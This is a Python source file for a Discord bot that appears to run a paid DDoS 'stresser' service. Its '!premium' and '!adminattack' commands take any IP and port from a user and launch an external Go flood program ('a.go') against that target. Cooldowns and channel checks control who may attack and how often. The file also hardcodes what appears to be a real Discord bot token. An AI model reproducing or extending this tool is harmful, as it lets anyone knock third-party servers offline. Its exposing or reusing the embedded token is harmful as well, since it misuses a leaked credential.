import discord
from discord.ext import commands
import re
import asyncio
import subprocess

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Global cooldown for regular !attack command
global_cooldown = commands.CooldownMapping.from_cooldown(1, 300, commands.BucketType.user)

# Cooldown for !adminattack command
admin_cooldown = commands.CooldownMapping.from_cooldown(1, 30, commands.BucketType.user)

def validate_ip_port(ip_port):
    # Simple regex for validating IP:Port format
    pattern = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+\b')
    return bool(pattern.match(ip_port))

def is_admin(ctx):
    return ctx.author.guild_permissions.administrator if ctx.guild else False

@bot.command(name='premium')
@commands.cooldown(1, 300, commands.BucketType.user)
async def attack(ctx, ip_port):
    # Check if the command is '!attack' and in the specific channel
    if ctx.invoked_with == 'premium' and ctx.channel.id == 1203676005286547486:
        # Validate the format of ip_port
        if not validate_ip_port(ip_port):
            await ctx.send("")
            return

        # Construct the Golang command with additional arguments
        additional_args = ['1000', 'get', '60', 'nil']
        golang_command = ['go', 'run', 'a.go', f'http://{ip_port}'] + additional_args

        # Run the Golang command using subprocess
        try:
            result = subprocess.run(golang_command, capture_output=True, text=True, check=True, timeout=30)
            output = result.stdout
        except subprocess.TimeoutExpired as e:
            message = await ctx.send(f"")
            await asyncio.sleep(5)  # Wait for 5 seconds
            await message.delete()  # Delete the message after 5 seconds
            return
        except subprocess.CalledProcessError as e:
            output = e.stderr

        # Send the output in smaller chunks
        for i in range(0, len(output), 4000):
            chunk = output[i:i+4000]
            await ctx.send(f'```{chunk}```')

# Error handling for cooldown
@attack.error
async def attack_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"")


@bot.command(name='adminattack')
@commands.check(is_admin)
@commands.cooldown(1, 30, commands.BucketType.channel)
async def admin_attack(ctx, ip_port):
    # Check if the command is '!adminattack' and in the specific channel
    if ctx.invoked_with == 'adminattack' and ctx.channel.id == 1203676005286547486:
        # Validate the format of ip_port
        if not validate_ip_port(ip_port):
            await ctx.send("")
            return

        # Implement admin cooldown
        bucket = admin_cooldown.get_bucket(ctx.message)
        try:
            bucket.update_rate_limit()
        except commands.CommandOnCooldown as e:
            await ctx.send(f"")
            return

        # Construct the Golang command with additional arguments
        additional_args = ['1000', 'get', '60', 'nil']
        golang_command = ['go', 'run', 'a.go', f'http://{ip_port}'] + additional_args

        # Run the Golang command using subprocess
        try:
            result = subprocess.run(golang_command, capture_output=True, text=True, check=True, timeout=30)
            output = result.stdout
        except subprocess.TimeoutExpired as e:
            await ctx.send(f"")
            return
        except subprocess.CalledProcessError as e:
            output = e.stderr

        # Send the output in smaller chunks
        for i in range(0, len(output), 4000):
            chunk = output[i:i+4000]
            await ctx.send(f'```{chunk}```')

# Error handling for adminattack cooldown
@admin_attack.error
async def admin_attack_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"")

# Replace 'YOUR_DISCORD_TOKEN' with your actual Discord bot token
bot.run('MTExMjQwMDUwOTk2MjMwMTUwMQ.GNXk3u.Xm3nwcpEgXvxiZxrLJ_PlB20XqNFQ0cnetgACY')
